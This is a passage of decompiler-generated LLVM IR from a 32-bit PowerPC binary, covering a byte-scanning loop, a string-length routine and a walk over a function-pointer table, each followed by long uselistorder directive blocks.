  %v0_1000d28c.off0 = phi i8 [ 0, %dec_label_pc_1000d27c ], [ 46, %dec_label_pc_1000d288 ]
  %v1_1000d28c = load i32, i32* @r25, align 4
  %v2_1000d28c = load i32, i32* @r29, align 4
  %v4_1000d28c = add i32 %v2_1000d28c, %v1_1000d28c
  %v5_1000d28c = inttoptr i32 %v4_1000d28c to i8*
  store i8 %v0_1000d28c.off0, i8* %v5_1000d28c, align 1
  %v0_1000d290.pre = load i32, i32* @r28, align 4
  %v0_1000d298.pre.pre = load i32, i32* @r23, align 4
  %v1_1000d294.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000d290

dec_label_pc_1000d290:                            ; preds = %dec_label_pc_1000d238, %dec_label_pc_1000d28c
  %v1_1000d294 = phi i32 [ %v2_1000d248, %dec_label_pc_1000d238 ], [ %v1_1000d294.pre, %dec_label_pc_1000d28c ]
  %v0_1000d298.pre = phi i32 [ 0, %dec_label_pc_1000d238 ], [ %v0_1000d298.pre.pre, %dec_label_pc_1000d28c ]
  %v0_1000d290 = phi i32 [ %v0_1000d240, %dec_label_pc_1000d238 ], [ %v0_1000d290.pre, %dec_label_pc_1000d28c ]
  %v0_1000d294.pre = load i32, i32* @r26, align 4
  store i32 %v0_1000d290, i32* %r11.global-to-local, align 4
  %v2_1000d294 = add i32 %v1_1000d294, %v0_1000d294.pre
  %v3_1000d294 = inttoptr i32 %v2_1000d294 to i8*
  %v4_1000d294 = load i8, i8* %v3_1000d294, align 1
  %v5_1000d294 = zext i8 %v4_1000d294 to i32
  store i32 %v5_1000d294, i32* @r31, align 4
  %v3_1000d298 = icmp eq i32 %v0_1000d298.pre, 0
  store i1 %v3_1000d298, i1* %cr4_eq.global-to-local, align 1
  %v3_1000d29c = icmp eq i8 %v4_1000d294, 0
  br i1 %v3_1000d29c, label %dec_label_pc_1000d2a4, label %dec_label_pc_1000d218

dec_label_pc_1000d2a4:                            ; preds = %dec_label_pc_1000d290
  %v0_1000d2ac.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1000d298, label %dec_label_pc_1000d2b8, label %dec_label_pc_1000d2a8

dec_label_pc_1000d2a8:                            ; preds = %dec_label_pc_1000d208, %dec_label_pc_1000d2a4
  %v0_1000d2ac.pre26 = phi i32 [ %v0_1000d2ac.pre.pre, %dec_label_pc_1000d2a4 ], [ 0, %dec_label_pc_1000d208 ]
  %v1_1000d2a8 = add i32 %v0_1000d2ac.pre26, 1
  store i32 %v1_1000d2a8, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000d2b8

dec_label_pc_1000d2b8:                            ; preds = %dec_label_pc_1000d250, %dec_label_pc_1000d2a4, %dec_label_pc_1000d2a8, %dec_label_pc_1000d1e0
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000d1e0 ], [ %v1_1000d2a8, %dec_label_pc_1000d2a8 ], [ %v0_1000d2ac.pre.pre, %dec_label_pc_1000d2a4 ], [ -1, %dec_label_pc_1000d250 ]
  %v1_1000d2c8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000d1e4)
  %v9_1000d2c8 = extractvalue %0 %v1_1000d2c8, 7
  store i4 %v9_1000d2c8, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1000d2ac.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1000d298, { 0, 2, 1 }
  uselistorder i32 %v5_1000d294, { 1, 0 }
  uselistorder i32 %v5_1000d29421, { 5, 4, 2, 3, 1, 0 }
  uselistorder i32 %v0_1000d1e4, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 2, 3, 4, 6, 0, 5, 1 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 3, 4, 0, 5, 1, 2 }
  uselistorder i32 ()* @function_10007108, { 7, 6, 20, 19, 4, 3, 17, 16, 2, 24, 11, 10, 0, 14, 15, 1, 18, 9, 8, 5, 23, 22, 21, 13, 12 }
  uselistorder i32* @r5, { 20, 21, 22, 3, 23, 24, 38, 64, 65, 26, 27, 7, 5, 28, 1, 29, 39, 40, 41, 42, 43, 44, 66, 12, 45, 46, 47, 48, 49, 50, 6, 67, 68, 79, 8, 30, 31, 71, 72, 73, 9, 25, 51, 52, 53, 80, 81, 82, 83, 74, 75, 2, 76, 77, 78, 32, 54, 56, 55, 57, 0, 58, 59, 60, 69, 70, 34, 35, 61, 62, 13, 63, 36, 4, 10, 11, 14, 15, 16, 17, 18, 19, 33, 37 }
  uselistorder i32* @r29, { 30, 31, 32, 33, 34, 129, 130, 1, 35, 12, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 16, 17, 18, 19, 20, 2, 47, 48, 49, 50, 51, 52, 53, 54, 65, 66, 67, 98, 131, 132, 55, 56, 57, 60, 61, 133, 134, 100, 101, 102, 99, 103, 14, 104, 105, 3, 106, 107, 108, 109, 110, 111, 135, 136, 137, 138, 139, 86, 87, 88, 89, 90, 22, 23, 91, 4, 92, 93, 94, 95, 96, 97, 62, 63, 64, 5, 140, 141, 142, 58, 59, 112, 113, 6, 114, 115, 116, 117, 68, 69, 13, 70, 71, 72, 73, 74, 75, 15, 7, 0, 76, 118, 119, 120, 121, 122, 123, 124, 127, 8, 11, 9, 128, 21, 125, 126, 143, 144, 145, 146, 77, 78, 79, 80, 81, 10, 82, 29, 83, 24, 25, 26, 27, 28, 84, 85 }
  uselistorder i32* @r28, { 2, 33, 34, 35, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 12, 3, 11, 13, 14, 15, 16, 17, 18, 55, 59, 56, 57, 58, 1, 93, 94, 62, 63, 128, 129, 95, 4, 96, 97, 98, 99, 100, 5, 130, 131, 132, 133, 140, 22, 23, 24, 25, 26, 27, 28, 29, 30, 89, 90, 91, 92, 64, 65, 134, 135, 136, 137, 138, 60, 61, 101, 102, 66, 6, 67, 68, 69, 70, 71, 72, 73, 74, 103, 104, 105, 7, 106, 107, 8, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 0, 124, 125, 19, 20, 21, 139, 75, 76, 77, 78, 9, 79, 10, 80, 81, 82, 83, 84, 85, 86, 126, 127, 87, 88, 31, 32 }
  uselistorder i32 23, { 0, 4, 5, 6, 1, 2, 3 }
  uselistorder i32 18, { 1, 0, 2, 3, 4 }
  uselistorder i32 8, { 52, 53, 54, 55, 56, 57, 20, 21, 58, 59, 60, 61, 62, 63, 25, 26, 22, 15, 17, 18, 27, 28, 29, 30, 31, 64, 71, 72, 73, 19, 94, 65, 0, 74, 95, 96, 97, 98, 99, 100, 101, 102, 12, 103, 104, 105, 127, 128, 135, 138, 10, 41, 42, 13, 32, 14, 43, 83, 33, 87, 86, 84, 85, 34, 35, 36, 88, 89, 90, 91, 92, 93, 1, 66, 67, 68, 23, 49, 50, 16, 51, 132, 133, 134, 2, 139, 3, 136, 137, 69, 75, 76, 37, 77, 38, 106, 107, 108, 109, 110, 24, 111, 112, 113, 114, 4, 5, 115, 116, 11, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 9, 6, 129, 130, 131, 78, 79, 80, 81, 39, 40, 82, 7, 8, 44, 45, 46, 47, 48, 70 }
  uselistorder i32* @r30, { 44, 45, 46, 8, 47, 49, 51, 52, 53, 54, 55, 48, 50, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 20, 21, 22, 1, 23, 24, 25, 7, 26, 27, 70, 67, 68, 5, 69, 4, 115, 116, 117, 9, 118, 119, 120, 71, 72, 73, 74, 75, 76, 77, 18, 78, 79, 80, 81, 82, 83, 84, 85, 121, 122, 123, 124, 125, 10, 126, 127, 128, 129, 130, 11, 154, 155, 156, 157, 12, 108, 158, 169, 159, 160, 28, 0, 41, 13, 42, 43, 109, 110, 111, 29, 30, 31, 32, 33, 112, 113, 114, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 161, 162, 163, 164, 165, 166, 167, 14, 168, 131, 132, 96, 15, 97, 98, 101, 99, 100, 102, 103, 105, 104, 6, 106, 133, 134, 135, 136, 137, 2, 139, 19, 140, 16, 141, 142, 138, 143, 144, 145, 146, 147, 148, 149, 17, 150, 151, 3, 152, 153, 107, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1 false, { 1, 2, 4, 5, 6, 7, 8, 0, 3, 9, 10 }
  uselistorder i32* @r31, { 77, 2, 7, 78, 6, 79, 80, 81, 8, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 47, 50, 9, 41, 10, 11, 51, 52, 53, 96, 97, 98, 99, 1, 100, 101, 102, 103, 104, 105, 106, 107, 215, 216, 217, 218, 219, 138, 12, 139, 140, 141, 142, 13, 143, 144, 145, 146, 147, 148, 220, 221, 222, 223, 224, 225, 226, 227, 228, 14, 229, 15, 273, 274, 275, 16, 109, 108, 3, 111, 112, 113, 114, 115, 116, 117, 118, 61, 62, 63, 64, 149, 17, 150, 151, 18, 152, 153, 19, 154, 155, 230, 231, 232, 233, 234, 20, 235, 236, 237, 238, 21, 239, 22, 240, 241, 242, 46, 243, 0, 276, 277, 278, 23, 48, 279, 42, 202, 24, 203, 285, 286, 44, 72, 280, 283, 284, 75, 76, 54, 55, 56, 57, 58, 73, 74, 4, 204, 205, 206, 207, 208, 209, 65, 66, 67, 210, 211, 212, 213, 214, 119, 120, 121, 26, 122, 123, 124, 25, 125, 126, 127, 128, 129, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 27, 110, 244, 245, 130, 131, 132, 29, 133, 28, 134, 156, 157, 158, 30, 159, 160, 161, 162, 163, 164, 165, 166, 31, 45, 167, 5, 168, 169, 135, 136, 137, 32, 170, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 35, 34, 263, 33, 267, 268, 36, 269, 270, 271, 272, 59, 60, 265, 264, 266, 281, 37, 282, 49, 38, 43, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 183, 182, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 68, 69, 70, 71, 197, 198, 199, 200, 39, 40, 201 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 2, 3, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 4, 16, 1, 17, 5 }
  uselistorder i32* @r25, { 3, 4, 5, 7, 8, 6, 9, 1, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18, 27, 30, 19, 20, 21, 22, 0, 23, 24, 25, 26, 28, 29 }
  uselistorder i32* @r26, { 1, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 3, 4, 20, 21, 22, 23, 24, 2, 25, 26, 27, 28, 29, 30, 31, 32, 33, 49, 50, 72, 48, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 69, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 0, 70, 71, 46, 67, 68, 47 }
  uselistorder i32 ()* @__asm_mfcr, { 27, 22, 18, 26, 25, 12, 17, 35, 11, 34, 9, 30, 8, 7, 6, 5, 4, 33, 3, 2, 1, 24, 29, 38, 21, 32, 16, 15, 31, 10, 28, 23, 14, 37, 13, 36, 19, 20, 0 }
  uselistorder label %dec_label_pc_1000d2b8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d2a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d290, { 1, 0 }
  uselistorder label %dec_label_pc_1000d28c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d27c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d238, { 1, 0 }
  uselistorder label %dec_label_pc_1000d220, { 1, 0 }
  uselistorder label %dec_label_pc_1000d218, { 1, 0 }
}

define i32 @function_1000d2d4() local_unnamed_addr {
dec_label_pc_1000d2d4:
  %r11.global-to-local = alloca i32, align 4
  %v0_1000d2d4 = load i32, i32* @r3, align 4
  store i32 %v0_1000d2d4, i32* %r11.global-to-local, align 4
  %v3_1000d2d4 = icmp eq i32 %v0_1000d2d4, 0
  %v0_1000d2dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d2d4, i32 %v0_1000d2dc)
  %v0_1000d2ec = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000d2f8

dec_label_pc_1000d2e4:                            ; preds = %dec_label_pc_1000d2f4
  %v1_1000d2e4 = add i32 %v1_1000d2f8, 2
  br label %dec_label_pc_1000d314

dec_label_pc_1000d2f4:                            ; preds = %dec_label_pc_1000d2f8
  %v2_1000d30c = add i32 %v1_1000d2fc, %v5_1000d2f8
  %v3_1000d308 = icmp eq i32 %v1_1000d304, 192
  br i1 %v3_1000d308, label %dec_label_pc_1000d2e4, label %dec_label_pc_1000d2f8

dec_label_pc_1000d2f8:                            ; preds = %dec_label_pc_1000d2f4, %dec_label_pc_1000d2d4
  %v1_1000d2f8 = phi i32 [ %v2_1000d30c, %dec_label_pc_1000d2f4 ], [ %v0_1000d2ec, %dec_label_pc_1000d2d4 ]
  %v0_1000d2f8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d2f8 = add i32 %v0_1000d2f8, %v1_1000d2f8
  %v3_1000d2f8 = inttoptr i32 %v2_1000d2f8 to i8*
  %v4_1000d2f8 = load i8, i8* %v3_1000d2f8, align 1
  %v5_1000d2f8 = zext i8 %v4_1000d2f8 to i32
  %v1_1000d2fc = add i32 %v1_1000d2f8, 1
  %v3_1000d300 = icmp eq i8 %v4_1000d2f8, 0
  %v1_1000d304 = call i32 @__asm_rlwinm(i32 %v5_1000d2f8, i32 0, i32 24, i32 25)
  br i1 %v3_1000d300, label %dec_label_pc_1000d314, label %dec_label_pc_1000d2f4

dec_label_pc_1000d314:                            ; preds = %dec_label_pc_1000d2f8, %dec_label_pc_1000d2e4
  %v1_1000d314 = phi i32 [ %v1_1000d2e4, %dec_label_pc_1000d2e4 ], [ %v1_1000d2fc, %dec_label_pc_1000d2f8 ]
  %v0_1000d314 = load i32, i32* @r4, align 4
  %v2_1000d314 = sub i32 %v1_1000d314, %v0_1000d314
  ret i32 %v2_1000d314

; uselistorder directives
  uselistorder i32 %v1_1000d2fc, { 1, 0 }
  uselistorder i32 %v5_1000d2f8, { 1, 0 }
  uselistorder i32 %v1_1000d2f8, { 2, 1, 0 }
  uselistorder i32 %v0_1000d2d4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 0, 62, 4, 35, 45, 46, 47, 5, 63, 64, 1, 43, 2, 44, 19, 20, 21, 65, 66, 67, 48, 33, 36, 37, 3, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 38, 39, 40, 41, 42, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 68 }
  uselistorder i32 25, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 24, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 20, 29, 16, 17, 18, 21, 22, 23, 30, 0, 28, 1, 31, 19, 24, 25, 26, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 27, 2, 3, 4, 5, 6 }
  uselistorder i8 0, { 32, 30, 3, 33, 1, 34, 35, 4, 5, 6, 7, 8, 25, 39, 37, 24, 38, 36, 23, 40, 41, 42, 43, 9, 45, 44, 26, 10, 46, 47, 11, 48, 49, 22, 28, 52, 50, 51, 27, 53, 54, 12, 56, 55, 29, 57, 58, 0, 59, 60, 61, 62, 13, 63, 65, 66, 67, 68, 64, 69, 14, 70, 71, 72, 73, 15, 16, 17, 18, 19, 75, 76, 77, 78, 74, 79, 2, 20, 80, 82, 81, 21, 83, 84, 85, 86, 87, 88, 91, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 111, 31, 113, 114, 115 }
  uselistorder i32 192, { 0, 1, 3, 2 }
  uselistorder i32 2, { 0, 31, 4, 88, 51, 89, 90, 32, 1, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 5, 103, 6, 79, 80, 81, 33, 30, 104, 105, 106, 107, 108, 52, 53, 54, 117, 118, 135, 43, 7, 8, 3, 55, 109, 9, 10, 34, 112, 113, 42, 119, 120, 11, 121, 122, 123, 136, 56, 57, 82, 58, 83, 59, 84, 137, 35, 12, 13, 14, 46, 49, 50, 60, 61, 110, 47, 15, 36, 138, 16, 17, 37, 38, 39, 62, 41, 40, 124, 125, 114, 115, 126, 127, 128, 18, 19, 20, 21, 22, 129, 130, 23, 132, 133, 134, 29, 131, 116, 63, 24, 139, 26, 25, 48, 65, 64, 67, 66, 69, 68, 85, 44, 71, 45, 86, 70, 87, 73, 72, 111, 27, 28, 75, 74, 76, 77, 78 }
  uselistorder i32* @r4, { 35, 36, 1, 37, 38, 39, 40, 2, 41, 42, 43, 44, 10, 11, 45, 46, 47, 48, 49, 50, 51, 52, 81, 106, 107, 53, 54, 56, 57, 58, 7, 59, 60, 61, 62, 63, 15, 12, 82, 83, 84, 85, 86, 87, 88, 89, 90, 117, 8, 9, 109, 14, 31, 32, 16, 17, 64, 65, 71, 72, 110, 111, 112, 55, 3, 91, 92, 93, 13, 94, 95, 66, 67, 68, 69, 70, 73, 74, 75, 4, 5, 116, 96, 76, 97, 98, 99, 0, 100, 101, 102, 108, 103, 104, 30, 105, 6, 18, 19, 113, 114, 115, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 33, 34, 77, 78, 79, 80 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 25, 12, 1, 17, 18, 19, 20, 21, 26, 16, 22, 13, 14, 28, 27, 23, 24, 2 }
}

define i32 @function_1000d31c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d31c:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r31.global-to-local, align 4
  %v3_1000d338 = load i32, i32* @global_var_10010000.2, align 4
  %v3_1000d33c = icmp eq i32 %v3_1000d338, -1
  br i1 %v3_1000d33c, label %dec_label_pc_1000d358, label %dec_label_pc_1000d344

dec_label_pc_1000d344:                            ; preds = %dec_label_pc_1000d31c, %dec_label_pc_1000d344
  %v0_1000d344 = phi i32 [ %v3_1000d34c, %dec_label_pc_1000d344 ], [ %v3_1000d338, %dec_label_pc_1000d31c ]
  call void @__pseudo_call(i32 %v0_1000d344)
  %v0_1000d34c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d34c = add i32 %v0_1000d34c, -4
  %v2_1000d34c = inttoptr i32 %v1_1000d34c to i32*
  %v3_1000d34c = load i32, i32* %v2_1000d34c, align 4
  store i32 %v1_1000d34c, i32* %r31.global-to-local, align 4
  %v3_1000d350 = icmp eq i32 %v3_1000d34c, -1
  br i1 %v3_1000d350, label %dec_label_pc_1000d358, label %dec_label_pc_1000d344

dec_label_pc_1000d358:                            ; preds = %dec_label_pc_1000d344, %dec_label_pc_1000d31c
  %v0_1000d368 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d368

; uselistorder directives
  uselistorder i32 %v3_1000d34c, { 1, 0 }
  uselistorder i32 -4, { 2, 21, 22, 23, 14, 15, 16, 17, 18, 24, 25, 3, 4, 5, 6, 7, 8, 9, 10, 11, 20, 19, 33, 34, 30, 31, 32, 26, 27, 28, 29, 12, 13, 0, 1 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 2, 0 }
  uselistorder i32 -1, { 199, 200, 16, 46, 57, 232, 233, 58, 288, 123, 234, 59, 235, 50, 60, 236, 61, 237, 201, 202, 111, 112, 63, 62, 203, 47, 48, 204, 205, 206, 161, 69, 67, 65, 207, 208, 209, 68, 66, 64, 210, 211, 162, 212, 163, 238, 26, 27, 164, 239, 165, 51, 273, 70, 289, 124, 3, 4, 290, 291, 52, 292, 293, 71, 72, 0, 166, 331, 30, 31, 32, 332, 167, 336, 28, 29, 213, 335, 222, 240, 33, 241, 242, 243, 127, 244, 245, 246, 247, 248, 249, 250, 125, 251, 126, 252, 253, 254, 255, 168, 294, 169, 53, 5, 170, 295, 296, 171, 172, 173, 297, 174, 256, 257, 34, 35, 36, 175, 258, 259, 176, 274, 275, 276, 49, 298, 299, 300, 121, 54, 301, 302, 303, 304, 128, 305, 6, 73, 306, 307, 308, 309, 310, 177, 311, 129, 312, 313, 130, 7, 8, 131, 55, 314, 178, 220, 179, 315, 316, 317, 318, 74, 75, 333, 334, 76, 284, 132, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 337, 88, 339, 338, 89, 223, 224, 133, 180, 225, 39, 40, 181, 226, 37, 38, 182, 229, 9, 134, 214, 10, 90, 56, 227, 41, 42, 183, 135, 113, 228, 91, 215, 285, 286, 45, 184, 260, 114, 261, 262, 136, 266, 92, 93, 230, 340, 341, 319, 94, 185, 186, 263, 264, 187, 265, 188, 189, 119, 190, 191, 192, 193, 194, 43, 195, 137, 95, 96, 267, 268, 269, 277, 115, 278, 279, 280, 17, 18, 19, 20, 21, 22, 23, 116, 117, 320, 15, 321, 11, 322, 323, 196, 138, 24, 197, 324, 325, 1, 327, 328, 2, 139, 140, 198, 44, 141, 122, 329, 142, 326, 281, 12, 25, 118, 143, 13, 221, 330, 144, 282, 145, 283, 146, 97, 98, 99, 100, 101, 102, 216, 103, 104, 105, 342, 217, 218, 219, 147, 148, 149, 150, 151, 106, 152, 231, 107, 153, 154, 270, 110, 109, 108, 271, 155, 272, 156, 157, 158, 159, 14, 120, 287, 160 }
  uselistorder i32 ptrtoint (i32* @global_var_10010000.2 to i32), { 51, 52, 53, 54, 55, 56, 1, 57, 58, 59, 37, 38, 2, 60, 4, 3, 39, 5, 61, 40, 62, 41, 63, 64, 65, 66, 67, 0, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 42, 43, 44, 8, 6, 7, 45, 9, 10, 11, 12, 13, 14, 15, 80, 81, 82, 17, 83, 84, 16, 85, 21, 20, 18, 19, 46, 24, 23, 22, 27, 25, 26, 28, 47, 33, 29, 30, 48, 31, 32, 34, 35, 36, 49, 50 }
  uselistorder i32 1, { 264, 753, 352, 754, 755, 756, 757, 758, 759, 273, 271, 272, 760, 466, 761, 762, 40, 41, 39, 42, 410, 763, 300, 296, 517, 294, 295, 764, 406, 765, 411, 768, 769, 770, 771, 772, 467, 773, 774, 775, 57, 56, 61, 60, 59, 58, 62, 55, 63, 776, 777, 778, 518, 171, 174, 172, 170, 173, 175, 779, 176, 177, 780, 169, 781, 148, 146, 145, 147, 399, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 520, 519, 307, 306, 305, 308, 309, 310, 691, 692, 693, 694, 521, 514, 191, 180, 189, 179, 185, 186, 187, 184, 182, 183, 181, 188, 190, 419, 782, 783, 402, 784, 785, 786, 787, 788, 789, 522, 107, 106, 108, 105, 109, 457, 793, 790, 791, 792, 523, 211, 209, 208, 205, 207, 210, 212, 204, 203, 206, 202, 201, 696, 697, 698, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 71, 69, 70, 67, 73, 68, 74, 72, 412, 699, 235, 75, 6, 234, 413, 893, 141, 138, 139, 137, 140, 116, 894, 525, 524, 111, 110, 112, 229, 388, 960, 468, 469, 527, 526, 324, 320, 323, 322, 319, 321, 0, 470, 530, 529, 528, 149, 150, 531, 532, 810, 400, 811, 815, 816, 817, 818, 819, 534, 533, 353, 354, 355, 356, 820, 821, 822, 395, 823, 824, 420, 825, 826, 438, 439, 471, 421, 434, 827, 473, 443, 828, 829, 474, 830, 831, 832, 472, 540, 539, 538, 537, 507, 536, 535, 129, 128, 123, 125, 126, 122, 127, 124, 130, 1, 833, 834, 835, 836, 422, 131, 700, 701, 120, 121, 702, 317, 316, 315, 314, 318, 895, 330, 331, 332, 335, 334, 333, 896, 897, 475, 898, 301, 303, 302, 278, 279, 274, 277, 276, 275, 476, 872, 873, 508, 114, 113, 115, 479, 899, 900, 901, 477, 902, 478, 903, 904, 905, 906, 907, 551, 550, 549, 548, 547, 546, 545, 544, 543, 542, 509, 541, 98, 95, 97, 94, 90, 96, 103, 99, 93, 100, 89, 92, 104, 91, 102, 101, 88, 87, 86, 908, 458, 82, 85, 84, 83, 81, 77, 78, 80, 79, 45, 44, 46, 961, 962, 4, 5, 3, 909, 910, 552, 362, 359, 361, 363, 364, 360, 423, 911, 555, 554, 553, 254, 313, 200, 556, 245, 250, 284, 253, 390, 389, 337, 265, 252, 557, 226, 558, 304, 326, 480, 559, 338, 481, 445, 444, 727, 563, 562, 561, 560, 291, 290, 287, 288, 292, 289, 293, 963, 566, 565, 564, 232, 231, 233, 230, 964, 567, 734, 735, 736, 459, 737, 424, 238, 240, 242, 237, 239, 236, 241, 243, 695, 160, 156, 154, 158, 155, 159, 157, 161, 728, 425, 729, 568, 347, 346, 345, 348, 349, 350, 351, 167, 166, 168, 165, 260, 256, 259, 258, 261, 263, 257, 262, 569, 570, 571, 178, 573, 572, 142, 143, 144, 37, 38, 152, 153, 151, 193, 192, 407, 574, 357, 446, 575, 576, 577, 578, 579, 580, 581, 582, 460, 461, 837, 426, 482, 838, 839, 447, 849, 585, 584, 583, 32, 30, 31, 29, 33, 28, 26, 27, 34, 25, 36, 35, 586, 587, 739, 740, 741, 742, 743, 744, 220, 221, 223, 224, 216, 215, 214, 222, 219, 217, 218, 213, 965, 589, 588, 391, 591, 590, 22, 21, 23, 592, 812, 766, 767, 912, 913, 593, 365, 367, 366, 368, 414, 914, 840, 841, 842, 843, 844, 845, 846, 847, 848, 194, 195, 198, 196, 197, 199, 852, 850, 851, 854, 853, 915, 916, 917, 855, 403, 164, 163, 162, 814, 813, 973, 974, 282, 280, 283, 281, 969, 970, 971, 972, 394, 393, 392, 24, 483, 856, 857, 858, 510, 8, 7, 9, 448, 874, 875, 876, 435, 415, 119, 118, 117, 877, 594, 76, 427, 484, 878, 596, 595, 597, 299, 298, 297, 859, 860, 598, 66, 65, 64, 599, 248, 249, 247, 246, 600, 286, 285, 918, 919, 486, 920, 921, 922, 923, 924, 925, 927, 928, 929, 487, 930, 931, 428, 932, 485, 933, 488, 934, 935, 936, 926, 604, 603, 602, 601, 19, 17, 14, 18, 12, 10, 11, 13, 15, 20, 16, 937, 938, 939, 940, 941, 373, 374, 369, 370, 371, 375, 372, 489, 339, 340, 942, 943, 135, 134, 136, 133, 945, 429, 946, 408, 430, 948, 949, 950, 951, 431, 953, 432, 952, 947, 511, 611, 610, 609, 608, 607, 606, 605, 379, 380, 383, 385, 376, 384, 382, 377, 381, 386, 378, 416, 417, 266, 267, 268, 944, 449, 512, 490, 329, 328, 327, 967, 450, 968, 879, 880, 881, 882, 883, 884, 418, 613, 612, 49, 47, 50, 48, 451, 615, 614, 53, 51, 54, 52, 617, 616, 270, 619, 618, 343, 344, 342, 621, 620, 885, 886, 623, 622, 132, 336, 227, 228, 251, 341, 387, 255, 358, 269, 966, 624, 244, 703, 704, 705, 706, 707, 708, 493, 440, 709, 710, 398, 491, 492, 494, 711, 495, 712, 713, 396, 433, 714, 631, 630, 629, 628, 627, 626, 625, 496, 452, 453, 454, 497, 498, 634, 633, 632, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 636, 635, 513, 43, 730, 731, 643, 642, 641, 640, 639, 638, 637, 732, 733, 652, 651, 650, 649, 648, 647, 646, 645, 644, 738, 441, 656, 655, 654, 653, 499, 745, 409, 746, 747, 397, 748, 660, 659, 658, 657, 312, 311, 749, 750, 751, 752, 861, 862, 500, 863, 864, 865, 501, 405, 866, 502, 867, 667, 666, 665, 664, 663, 662, 661, 225, 436, 401, 868, 437, 455, 869, 503, 871, 404, 442, 870, 504, 505, 506, 675, 674, 673, 672, 671, 670, 669, 668, 887, 888, 676, 889, 890, 456, 891, 2, 892, 677, 463, 954, 955, 462, 956, 957, 464, 465, 958, 959, 679, 678, 325, 515, 516 }
  uselistorder label %dec_label_pc_1000d344, { 1, 0 }
}

define i32 @function_1000d36c() local_unnamed_addr {
dec_label_pc_1000d36c:
  %v0_1000d384 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d384

; uselistorder directives
